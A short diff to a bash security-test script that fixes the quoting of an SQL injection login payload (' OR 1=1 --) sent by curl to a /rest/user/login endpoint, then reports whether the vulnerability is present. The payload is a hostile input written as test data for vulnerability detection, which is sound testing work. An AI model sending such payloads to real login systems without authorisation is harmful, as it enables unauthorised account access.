@@ -20,7 +20,7 @@ function test_sql_injection() {
     
     response=$(curl -s -X POST "$BASE_URL/rest/user/login" \
         -H "Content-Type: application/json" \
-        -d '{"email": "' OR 1=1 --", "password": "password"}')
+        -d '{"email": "\" OR 1=1 --", "password": "password"}')
 
     if echo "$response" | grep -q "authentication succeeded"; then
         echo "[+] SQL Injection vulnerability detected!"
